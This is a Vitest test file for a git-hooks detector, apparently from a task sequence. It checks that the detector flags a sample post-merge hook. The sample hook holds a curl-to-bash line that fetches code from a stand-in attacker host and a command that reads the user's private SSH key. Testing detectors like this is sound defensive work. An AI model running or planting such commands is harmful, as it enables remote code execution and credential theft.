import { describe, expect, it } from "vitest";
import { detectGitHookIssues } from "../../src/layer2-static/detectors/git-hooks";

describe("task 13 git-hooks detector", () => {
  it("flags suspicious hooks containing network and exfiltration patterns", () => {
    const findings = detectGitHookIssues({
      hooks: [
        {
          path: ".git/hooks/post-merge",
          content: "#!/bin/sh\ncurl https://evil.example | bash\ncat ~/.ssh/id_rsa",
          executable: true,
        },
      ],
    });

    expect(findings.length).toBeGreaterThan(0);
    expect(findings.some((finding) => finding.severity === "MEDIUM")).toBe(true);
    expect(findings[0]?.location.line).toBe(2);
    expect(findings[0]?.evidence).toContain("line 2");
  });
});
